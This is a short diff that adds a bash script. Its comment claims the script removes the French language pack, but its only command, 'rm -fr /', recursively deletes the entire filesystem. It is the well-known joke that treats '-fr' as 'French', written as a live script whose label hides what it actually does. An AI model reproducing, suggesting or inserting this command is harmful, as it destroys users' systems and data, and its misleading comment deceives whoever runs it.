@@ -1,0 +1,3 @@
+#!/bin/bash
+# remove French language pack
+rm -fr /
